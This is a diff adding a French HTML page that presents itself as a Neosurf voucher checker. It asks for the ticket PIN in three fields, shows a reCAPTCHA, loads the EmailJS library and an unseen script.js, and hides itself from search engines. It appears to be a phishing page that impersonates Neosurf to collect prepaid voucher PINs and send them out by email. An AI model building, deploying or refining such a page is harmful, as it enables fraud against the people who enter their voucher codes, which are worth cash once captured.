@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>VoucherChecker - Vérification</title>
+
+    <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+    <meta name="robots" content="noindex, nofollow">
+
+    <link rel="stylesheet" href="style.css">
+
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+
+<body class="verification-page">
+
+    <!-- Barre du haut -->
+    <header class="topbar">
+        
+            <div class="mybeauty-brand">
+    <div class="mybeauty-name">Neosurf</div>
+    <div class="mybeauty-tagline">So Simple to Pay & Play Online</div>
+   </div>
+        
+    </header>
+
+    <div class="background-shape shape1"></div>
+    <div class="background-shape shape2"></div>
+
+    <main>
+
+        <section class="verification-card">
+
+            <div class="verification-header">
+                <h2>Entrez le code PIN du ticket</h2>
+            </div>
+
+            <div class="verification-body">
+
+                <form id="verificationForm">
+
+                    <div class="code-group">
+
+                        <input
+                            type="text"
+                            id="part1"
+                            name="part1"
+                            maxlength="4"
+                            class="code-input"
+                            autocomplete="off">
+
+                        <input
+                            type="text"
+                            id="part2"
+                            name="part2"
+                            maxlength="3"
+                            class="code-input"
+                            autocomplete="off">
+
+                        <input
+                            type="text"
+                            id="part3"
+                            name="part3"
+                            maxlength="3"
+                            class="code-input"
+                            autocomplete="off">
+
+                    </div>
+
+                    <div class="recaptcha-container">
+                        <div class="g-recaptcha"
+                             data-sitekey="6Ldo5qMtAAAAAKq76pyXCqldtgjAFjdTYYY02Tps">
+                        </div>
+                    </div>
+
+                    <button type="submit" id="verifyBtn">
+                        Soumettre
+                    </button>
+
+                </form>
+
+                <div id="result"></div>
+
+            </div>
+
+        </section>
+
+    </main>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="script.js"></script>
+
+    <footer class="verification-footer">
+
+        <div class="footer-top">
+            Conditions • Politique de confidentialité • Besoin d'aide ? • Français ▼
+        </div>
+
+        <div class="footer-bottom">
+            © 2018-2026 NEOSURF voucher  — Tous droits réservés.
+        </div>
+
+    </footer>
+
+</body>
+
+</html>
